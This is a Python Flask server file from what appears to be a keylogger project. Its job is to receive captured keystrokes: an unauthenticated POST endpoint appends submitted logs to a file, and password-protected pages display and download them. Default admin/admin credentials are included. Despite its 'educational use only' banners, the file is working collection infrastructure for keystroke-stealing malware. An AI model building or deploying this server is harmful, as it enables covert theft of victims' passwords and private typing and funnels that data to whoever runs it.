"""
Web Server Module
Flask web server to view and download keylogger logs.
For educational purposes only.
"""

import os
import sys
import json
import argparse
from functools import wraps
from flask import Flask, render_template_string, send_file, request, Response

# ASCII Art Banner
BANNER = r"""
             __        __   _       ____                           
             \ \      / /__| |__   / ___|  ___ _ ____   _____ _ __ 
              \ \ /\ / / _ \ '_ \  \___ \ / _ \ '__\ \ / / _ \ '__|
               \ V  V /  __/ |_) |  ___) |  __/ |   \ V /  __/ |   
                \_/\_/ \___|_.__/  |____/ \___|_|    \_/ \___|_|   


Github: https://github.com/Stalin-143
"""

app = Flask(__name__)

# Global configuration
CONFIG = {
    'log_file_path': 'logs/keylog.txt',
    'username': 'admin',
    'password': 'admin'
}


def check_auth(username, password):
    """
    Check if username and password are valid.

    Args:
        username (str): Username to check
        password (str): Password to check

    Returns:
        bool: True if valid, False otherwise
    """
    return username == CONFIG['username'] and password == CONFIG['password']


def authenticate():
    """Send a 401 response to enable basic auth."""
    return Response(
        'Unauthorized Access. Please log in with correct credentials.',
        401,
        {'WWW-Authenticate': 'Basic realm="Login Required"'}
    )


def requires_auth(f):
    """
    Decorator to enforce authentication on routes.

    Args:
        f: Function to decorate

    Returns:
        Decorated function
    """
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated


# HTML template to display the log contents and provide a download link
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Keylogger Log Viewer</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 20px;
        }
        h1 {
            color: #333;
        }
        pre {
            background-color: #fff;
            padding: 15px;
            border: 1px solid #ccc;
            max-height: 400px;
            overflow-y: scroll;
        }
        .button {
            padding: 10px 15px;
            background-color: #4CAF50;
            color: white;
            text-align: center;
            border: none;
            cursor: pointer;
            margin-top: 20px;
            text-decoration: none;
            display: inline-block;
        }
        .button:hover {
            background-color: #45a049;
        }
        .warning {
            background-color: #fff3cd;
            border: 1px solid #ffc107;
            padding: 10px;
            margin-bottom: 20px;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="warning">
        <strong>⚠️ Educational Use Only:</strong> This tool is for authorized security testing and educational purposes only.
        Unauthorized use is illegal.
    </div>
    
    <h1>Log File: {{ log_file_path }}</h1>

    <h2>Log File Contents:</h2>
    <pre>{{ log_contents }}</pre>

    <a href="{{ url_for('download_log') }}" class="button">Download Log File</a>
</body>
</html>
'''


@app.route('/', methods=['GET'])
@requires_auth
def home():
    """
    Display the log file contents.

    Returns:
        HTML page with log contents
    """
    log_file_path = CONFIG['log_file_path']
    
    if os.path.exists(log_file_path):
        try:
            with open(log_file_path, 'r') as file:
                log_contents = file.read()
        except Exception as e:
            log_contents = f"Error reading log file: {e}"
    else:
        log_contents = "Log file not found."

    return render_template_string(
        HTML_TEMPLATE,
        log_file_path=log_file_path,
        log_contents=log_contents
    )


@app.route('/download', methods=['GET'])
@requires_auth
def download_log():
    """
    Download the log file.

    Returns:
        File download response or error message
    """
    log_file_path = CONFIG['log_file_path']
    
    if os.path.exists(log_file_path):
        return send_file(log_file_path, as_attachment=True)
    return "Log file not found."


@app.route('/', methods=['POST'])
def receive_log():
    """
    Receive log data from keylogger.

    Returns:
        Success or error message
    """
    try:
        log_data = request.form.get('log', '')
        if log_data:
            log_file_path = CONFIG['log_file_path']
            
            # Ensure log directory exists
            log_dir = os.path.dirname(log_file_path)
            if log_dir and not os.path.exists(log_dir):
                os.makedirs(log_dir, exist_ok=True)
            
            # Append log data to file
            with open(log_file_path, 'a') as f:
                f.write(log_data)
            
            return "Log received successfully", 200
        return "No log data provided", 400
    except Exception as e:
        return f"Error: {str(e)}", 500


def load_config(config_path):
    """
    Load configuration from JSON file.

    Args:
        config_path (str): Path to the config file

    Returns:
        dict: Configuration dictionary
    """
    try:
        with open(config_path, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        print(f"Warning: Config file not found at {config_path}")
        print("Using default configuration.")
        return {}
    except json.JSONDecodeError as e:
        print(f"Error: Invalid JSON in config file: {e}")
        return {}


def main():
    """Main function to run the web server."""
    print(BANNER)
    
    parser = argparse.ArgumentParser(
        description='Web Server for Keylogger - For educational purposes only',
        epilog='Always obtain explicit consent before using monitoring tools.'
    )
    parser.add_argument(
        '--config',
        default='config/config.json',
        help='Path to configuration file (default: config/config.json)'
    )
    parser.add_argument(
        '--log-file',
        help='Override log file path from config'
    )
    parser.add_argument(
        '--host',
        default='0.0.0.0',
        help='Host to bind to (default: 0.0.0.0)'
    )
    parser.add_argument(
        '--port',
        type=int,
        default=5000,
        help='Port to bind to (default: 5000)'
    )
    parser.add_argument(
        '--debug',
        action='store_true',
        help='Enable debug mode'
    )

    args = parser.parse_args()

    # Load configuration
    config = load_config(args.config)
    server_config = config.get('web_server', {})

    # Update global config
    CONFIG['log_file_path'] = args.log_file or server_config.get('log_file_path', 'logs/keylog.txt')
    
    # Load credentials from environment variables or config
    CONFIG['username'] = os.getenv('WEB_SERVER_USERNAME', 'admin')
    CONFIG['password'] = os.getenv('WEB_SERVER_PASSWORD', 'admin')
    
    if CONFIG['password'] == 'admin':
        print("⚠️  WARNING: Using default password. Please set WEB_SERVER_PASSWORD environment variable.")
    
    # Get server settings
    host = args.host or server_config.get('host', '0.0.0.0')
    port = args.port or server_config.get('port', 5000)
    debug = args.debug or server_config.get('debug', False)

    print(f"\nStarting web server on {host}:{port}")
    print(f"Log file path: {CONFIG['log_file_path']}")
    print(f"Username: {CONFIG['username']}")
    print("-" * 50)
    
    app.run(host=host, port=port, debug=debug)


if __name__ == '__main__':
    main()
